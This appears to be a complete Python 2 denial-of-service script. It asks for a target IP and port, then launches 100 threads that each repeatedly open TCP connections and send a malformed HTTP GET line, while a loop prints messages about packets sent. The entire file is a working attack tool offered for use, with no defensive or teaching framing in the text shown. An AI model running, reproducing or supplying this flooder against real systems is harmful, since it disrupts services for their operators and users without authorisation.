import socket
from threading import Thread
from colorama import init, Fore, Style
init()

host = raw_input("IP Target : ")
ip = host
port = input("Port      : ")
port = port
def dos():
    while True:
        mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        try:
            mysocket.connect((ip, port))
            mysocket.send(str.encode("GET " + "DOS" + "HTTP/1.1 \r\n"))
            mysocket.sendto(str.encode("GET " + "DOS" + "HTTP/1.1 \r\n"), (ip, port) )
        except socket.error:
            print("error")
        mysocket.close()

for i in range(100):
    t = Thread(target=dos)
    t.start()

while True:
     print "Send packet to %s throught port:%s"%(ip,port)


